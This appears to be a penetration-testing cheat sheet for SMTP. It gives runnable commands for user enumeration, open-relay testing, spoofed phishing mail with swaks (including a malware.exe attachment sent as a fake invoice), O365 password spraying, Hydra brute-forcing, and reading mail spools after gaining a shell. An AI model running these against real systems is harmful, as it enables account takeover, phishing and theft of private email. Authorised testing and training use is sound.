# SMTP
**Default Ports:**
- `25`: SMTP (Unencrypted/Relay) 
- `587`: Submission (Modern, often TLS)
- `465`: SMTPS (SSL/Legacy)

**Key Insight:** SMTP is a goldmine for **User Enumeration** (finding valid usernames for brute force) and **Phishing** (Open Relays).
## 1. Basic Enumeration
**Goal:** Identify the software version (Postfix, Exchange, Sendmail) and supported commands.
### Banner Grabbing
```shell
# Manual Interaction (Telnet/NC)
# Look for the 220 banner.
nc -nv 10.129.2.15 25

# Nmap - Version & Script Scan
nmap -p 25,465,587 -sC -sV 10.129.2.15
```
### MX Record Lookup (External)
**Description:** Identify the mail servers for a domain.
```shell
# Host command
host -t MX target.com

# Dig command (Clean output)
dig mx target.com +short
```
## 2. User Enumeration
**Goal:** Validate which users exist on the system to build a target list for password attacks.
### Manual Verification (VRFY / EXPN / RCPT)
**Description:** Interacting directly with the service to ask "Does this user exist?".
```SHELL
# 1. Connect
telnet 10.129.2.15 25

# 2. VRFY (Verify User)
# Response 250/252 = Exists | 550 = Unknown
VRFY root
VRFY john

# 3. EXPN (Expand List)
# Reveals actual users behind an alias (e.g., 'all-staff').
EXPN support-team

# 4. RCPT TO (Receipt To)
# Often effective even if VRFY is disabled.
MAIL FROM:test@target.com
RCPT TO:john
```
### Automated Enumeration Tools
**Tool:** `smtp-user-enum` (Standard) 
**Syntax:** `smtp-user-enum -M <METHOD> -U <USERLIST> -t <TARGET>`
```SHELL
# Method: VRFY (Fastest)
smtp-user-enum -M VRFY -U /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -t 10.129.2.15

# Method: RCPT (Stealthier fallback)
smtp-user-enum -M RCPT -U users.txt -t 10.129.2.15
```
## 3. Open Relay Vulnerability
**Description:** The server is misconfigured to allow _anyone_ to send email _through_ it to an _external_ destination. This is a critical finding for Phishing campaigns.
### Manual Test (Telnet)
**Step-by-Step:**
1. Connect to the server.
2. Set sender as "Attacker".
3. Set recipient as an **External** email (e.g., Gmail).
4. If the server accepts it (`250 OK`), it is an Open Relay.

```shell
telnet 10.129.2.15 25

HELO attacker.com
MAIL FROM: <attacker@evil.com>
RCPT TO: <victim@gmail.com>  <-- CRITICAL: Must be external
DATA
Subject: Test Relay
.
QUIT
```
### Automated Test (Nmap)
```shell
# Checks if the server allows relaying
nmap -p 25 --script smtp-open-relay 10.129.2.15
```
## 4. Spoofing & Phishing (Swaks)
**Tool:** `swaks` (Swiss Army Knife for SMTP) 
**Description:** The best tool for testing mail flow, spoofing, and sending phishing payloads.
### Basic Spoofing (Internal)
**Scenario:** Sending an email _as_ the CEO _to_ an employee. 
**Syntax:** `swaks --to <VICTIM> --from <SPOOFED_SENDER> --server <IP>`
```shell
# Spoofing 'admin@target.com' sending to 'employees@target.com'
swaks --to employees@target.com --from admin@target.com --server 10.129.2.15 --header "Subject: Urgent Update" --body "Please click here."
```
### Authenticated Sending
**Scenario:** You have valid credentials (`creds.txt`) and want to send mail legitimately.
```shell
# --auth-user and --auth-password
swaks --to victim@target.com --from legitimate@target.com --server 10.129.2.15 --auth --auth-user jsmith --auth-password 'Password123'
```
### Malicious Attachment
**Scenario:** Delivering a malware payload.
```shell
swaks --to victim@target.com --from hr@target.com --server 10.129.2.15 --header "Subject: Invoice" --body "See attached." --attach @malware.exe
```
## 5. Cloud Enumeration (O365)
**Context:** Many organizations use Hybrid Exchange or O365. 
**Tool:** `o365spray` (Python) 
**Docs:** [https://github.com/0xZDH/o365spray](https://github.com/0xZDH/o365spray)
### Validation & Enumeration
```shell
# 1. Validate if domain uses O365
python3 o365spray.py --validate --domain target.com

# 2. Enumerate Users (Verify valid accounts)
python3 o365spray.py --enum -U users.txt --domain target.com
```
### Password Spraying (Cloud)
**Warning:** Be extremely careful with lockout policies (`--lockout` flag).
```shell
# Spray ONE password against found users
# --count 1: 1 attempt per rotation
# --lockout 1: Stop if lockout detected
python3 o365spray.py --spray -U valid_users.txt -p 'Welcome2024!' --count 1 --lockout 1 --domain target.com
```
## 6. Password Attacks (On-Premise)
**Tool:** `Hydra` 
**Target:** POP3 (110/995) or IMAP (143/993) are usually better for brute-forcing than SMTP.
```shell
# POP3 Brute Force
hydra -L users.txt -p 'Company01!' -f 10.129.2.15 pop3
```
## 7. Post-Exploitation (Local)
**Context:** You have shell access to the mail server.
```shell
# 1. Postfix Configuration (Look for 'mynetworks' for relay rules)
cat /etc/postfix/main.cf | grep -v "#"

# 2. Read Mail Logs (Who is emailing whom?)
cat /var/log/mail.log

# 3. Loot User Emails (Cleartext messages)
cat /var/mail/root
ls -R /home/jsmith/Maildir/
```